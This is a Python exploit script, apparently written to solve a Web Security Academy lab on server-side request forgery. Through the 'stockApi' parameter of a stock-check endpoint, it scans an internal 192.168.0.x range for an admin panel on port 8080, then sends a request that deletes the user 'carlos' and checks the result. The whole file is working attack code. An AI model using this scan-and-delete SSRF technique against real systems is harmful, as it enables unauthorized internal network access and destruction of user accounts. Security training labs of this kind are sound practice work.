```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_admin_hostname(url):
    check_stock_path = "/product/stock"
    admin_ip_address = ''
    print("(+) Starting admin hostname check...")

    for i in range(1, 256):
        hostname = 'http://192.168.0.%s:8080/admin' % i
        params = {'stockApi': hostname}
        try:
            r = requests.post(url + check_stock_path, data=params, verify=False, timeout=3)  # Add timeout
            print(f"(+) Checking hostname: {hostname}, Status Code: {r.status_code}")
            if r.status_code == 200:
                admin_ip_address = '192.168.0.%s' % i
                break
        except requests.exceptions.RequestException as e:
            print(f"(-) Request to {hostname} failed: {e}")

    if admin_ip_address == '':
        print("(-) Could not find admin hostname.")
    return admin_ip_address

def delete_user(url, admin_ip_address):
    delete_user_url_ssrf_payload = 'http://%s:8080/admin/delete?username=carlos' % admin_ip_address
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False)

    print(f"(+) Deleting user, Status Code: {r.status_code}")


    check_admin_url_ssrf_payload = 'http://%s:8080/admin' % admin_ip_address
    params2 = {'stockApi': check_admin_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False)

    print(f"(+) Checking admin page, Status Code: {r.status_code}")

    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user")
        return True
    else:
        print("(-) Exploit was unsuccessful.")
        return False

def main():

    url = "https://0a2600a4035bb16282863332009a000d.web-security-academy.net"

    print("(+) Finding admin hostname...")
    admin_ip_address = check_admin_hostname(url)
    if admin_ip_address:
        print("(+) Found the admin IP address: %s" % admin_ip_address)
        print("(+) Deleting Carlos user...")
        success = delete_user(url, admin_ip_address)
        if success:
            return  # Stop the script after successful deletion

if __name__ == "__main__":
    main()
```
